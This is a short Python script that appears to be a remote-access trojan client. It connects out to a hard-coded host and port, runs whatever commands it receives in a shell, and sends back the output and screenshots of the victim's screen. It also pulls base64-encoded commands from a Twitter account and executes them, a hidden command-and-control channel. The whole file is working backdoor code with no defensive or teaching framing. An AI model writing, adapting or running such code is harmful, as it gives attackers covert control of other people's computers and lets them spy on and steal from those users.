import socket 
import subprocess
from mss import mss 
import base64
import requests 
from bs4 import BeautifulSoup as soup  
import time




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.134', 4000))

data = ""

def shell(data): 
    process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    out = process.stdout.read() + process.stderr.read()
    s.send(out)

def screen():
    with mss() as sct:
        return sct.shot(output="test.png")

while data != "exit":
    data = s.recv(1024).decode()
    if str(data) == "photo": 
        screen()
        with open("test.png", "rb") as img_file:
             s.send(img_file.read())

    elif str(data) == "twitter":


        url = "https://twitter.com/S1mpleCC"
        data = requests.get(url)
        data = soup(data.text,"html.parser")
        cmd = data.find('div', {'class':'tweet'}).find('p', {'class': 'tweet-text'}).string
        timeTweet = data.find('div', {'class':'tweet'}).find('data-time-ms').string
        
        cmd = str(base64.b64decode(cmd), 'utf-8')

        ts = time.time()
        shell(cmd)
    else:
        data = s.recv(1024).decode()
        shell(data)
       
s.close()

